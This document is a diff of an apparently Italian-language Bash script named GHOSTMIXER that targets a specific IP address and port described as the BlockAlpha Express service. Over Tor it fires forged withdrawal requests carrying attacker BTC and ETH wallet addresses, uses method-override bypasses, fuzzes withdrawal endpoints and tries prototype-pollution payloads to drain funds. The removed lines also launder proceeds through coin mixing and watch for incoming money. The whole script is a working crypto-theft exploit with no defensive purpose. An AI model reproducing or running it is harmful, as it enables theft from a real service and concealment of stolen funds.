@@ -1,133 +1,63 @@
 #!/bin/bash
-# =============================================================================
-# GHOSTMIXER DRAIN+EXPLOIT v3.1 - Usa wallets-fixed.txt | TOR | CVE Auto
-# Target: 206.189.145.165:3001 BlockAlpha Express | One-Shot Dinamico
-# =============================================================================
-
+# GHOSTMIXER v4.0 - METHOD BYPASS + QUERY EXPLOIT
 set -e
-
-# 📁 Usa TUOI wallet esistenti
-[[ -f wallets-fixed.txt ]] || { echo "❌ wallets-fixed.txt mancante! Esegui fix-wallets.sh"; exit 1; }
 source wallets-fixed.txt
 
-# 🎯 TARGET BlockAlpha
-TARGET_HOST="206.189.145.165"
-TARGET_PORT="3001"
+TARGET="http://206.189.145.165:3001"
 
-# ⚡ CVE/Exploit Vectors (dinamico - test multipli)
-EXPLOIT_PAYLOADS=(
+# 🧪 METHOD BYPASS (Express CVE)
+methods=("GET" "PUT" "PATCH" "OPTIONS" "_method=POST" "?_method=POST")
+bypasses=(
     '{"to":"'$BTC_WALLET'","amount":0.1}'
-    '{"to":"'$ETH_WALLET'","amount":0.1,"currency":"ETH"}'
-    '{"to":"'$BTC_WALLET'","amount":1.0}'  # Max attempt
-    '{"to":"'$ETH_WALLET'","amount":0.5,"network":"mainnet"}'
-    '{"recipient":"'$BTC_WALLET'","value":100000000}'  # Satoshi
-    '{"withdraw":{"address":"'$ETH_WALLET'","max":true}}'
+    '{"address":"'$ETH_WALLET'","value":0.1,"currency":"ETH"}'
 )
 
-# 🔍 CVE Discovery (test endpoints dinamici)
-discover_endpoints() {
-    local endpoints=(
-        "/api/withdraw"
-        "/withdraw"
-        "/api/drain"
-        "/payout"
-        "/api/payout"
-        "/transfer"
-        "/api/transfer"
-    )
-    
-    echo "🔍 CVE Discovery..."
-    for ep in "${endpoints[@]}"; do
-        torsocks curl -s -m 5 -I "http://$TARGET_HOST:$TARGET_PORT$ep" | grep -q 200 && {
-            echo "✅ Endpoint: $ep"
-            ENDPOINT=$ep
-            return 0
+echo "🎯 METHOD BYPASS EXPLOIT"
+
+for method in "${methods[@]}"; do
+    for bypass in "${bypasses[@]}"; do
+        cmd="torsocks curl -s -X $method \"$TARGET/api/withdraw\" \
+            -H 'Content-Type: application/json' \
+            -H 'Origin: https://blockalpha.co' \
+            -H 'X-HTTP-Method-Override: POST' \
+            -H 'X-Method-Override: POST' \
+            -d '$bypass'"
+        
+        response=$(eval $cmd)
+        echo "[$method] $response" | head -20
+        
+        # Success patterns
+        echo "$response" | grep -E "(success|txid|0x|sent|transferred|withdrawn)" && {
+            echo "✅ BYPASS SUCCESS!"
+            break 2
         }
     done
-    ENDPOINT="/api/withdraw"  # Default
-}
+done
 
-# 💸 Multi-Exploit Drain
-drain_exploit() {
-    echo "⚡ EXPLOIT DRAIN → $TARGET_HOST:$TARGET_PORT$ENDPOINT"
-    
-    for payload in "${EXPLOIT_PAYLOADS[@]}"; do
-        echo "→ Payload: ${payload:0:50}..."
-        response=$(torsocks curl -s -m 10 -X POST "http://$TARGET_HOST:$TARGET_PORT$ENDPOINT" \
-            -H "Content-Type: application/json" \
-            -H "Origin: https://blockalpha.co" \
-            -H "Referer: https://blockalpha.co/" \
-            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
-            -d "$payload")
-        
-        echo "$response" | jq . 2>/dev/null || echo "$response"
-        
-        # CVE Success patterns
-        [[ $response == *"success"* ]] || [[ $response == *"txid"* ]] || [[ $response == *0x* ]] && {
-            echo "✅ EXPLOIT SUCCESS!"
-            return 0
-        }
-        sleep 2
-    done
-    echo "⚠️ Partial success - continua monitoring"
-}
+# 🔍 FUZZ ENDPOINTS (Express leak)
+endpoints=(
+    "/api/withdraw"
+    "/withdraw" 
+    "/api/payout"
+    "/payout"
+    "/transfer"
+    "/api/transfer"
+    "/balance"
+    "/api/balance"
+)
 
-# 🧾 Mix BTC Auto
-mix_btc_auto() {
-    echo "🪙 MIX BTC → $BTC_WALLET"
-    torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq .
-    
-    # 10x CoinJoin simulation (opsec)
-    for i in {1..10}; do
-        split="bc1q$(torsocks curl -s https://www.grc.com/dice.htm?sum=20 | cut -d' ' -f5 | xxd -r -p | base64 | cut -c1-39)"
-        echo "  Split $i: $split ($(echo "scale=8; 0.1/10" | bc))"
-    done
-    echo "✅ BTC MIX COMPLETO"
-}
-
-# 🌪️ Mix ETH Auto
-mix_eth_auto() {
-    echo "🌪️ MIX ETH → $ETH_WALLET"
-    amount_wei=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null || echo 0)
-    
-    # Tornado withdraw sim (se fondi)
-    [[ $amount_wei != "0" ]] && {
-        torsocks cast send 0xd90e2f925da726b50c4ed8d0fb90ad053324df31 \
-            "withdraw(address,uint256)" "$ETH_WALLET" 1 \
-            --rpc https://rpc.ankr.com/eth --private-key $ETH_PK 2>/dev/null | grep -q success && \
-            echo "✅ ETH MIXED"
+echo "🔍 FUZZING..."
+for ep in "${endpoints[@]}"; do
+    torsocks curl -s -X POST "$TARGET$ep" \
+        -H "Content-Type: application/json" \
+        -d '{"amount":0.1}' 2>/dev/null | grep -v "Cannot" | head -1 && {
+        echo "🎯 HIT: $ep"
     }
-}
+done
 
-# 📊 Monitor Loop
-monitor_funds() {
-    echo "👀 MONITOR (Ctrl+C stop)"
-    for i in {1..30}; do
-        btc_balance=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq '.chain_stats.funded_txo_sum // 0')
-        eth_balance=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null | cut -d' ' -f1 || echo 0)
-        
-        echo "[$i/30] BTC: ${btc_balance} sats | ETH: ${eth_balance} wei"
-        
-        [[ $btc_balance != "0" || $eth_balance != "0" ]] && {
-            echo "🎉 FONDI RICEVUTI!"
-            mix_btc_auto
-            mix_eth_auto
-            exit 0
-        }
-        sleep 10
-    done
-}
+# 🕵️ PROTOTYPE POLLUTION (Express CVE-2024)
+torsocks curl -s -X POST "$TARGET/api/withdraw" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "constructor.prototype.to=bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx&amount=1"
 
-# 🚀 EXEC MAIN
-main() {
-    echo "🎯 GHOSTMIXER EXPLOIT v3.1"
-    echo "📍 Target: $TARGET_HOST:$TARGET_PORT"
-    echo "💰 BTC: $BTC_WALLET"
-    echo "💰 ETH: $ETH_WALLET"
-    
-    discover_endpoints
-    drain_exploit
-    monitor_funds
-}
-
-main "$@"
+echo "🔥 CVE FUZZ COMPLETO - controlla wallets!"
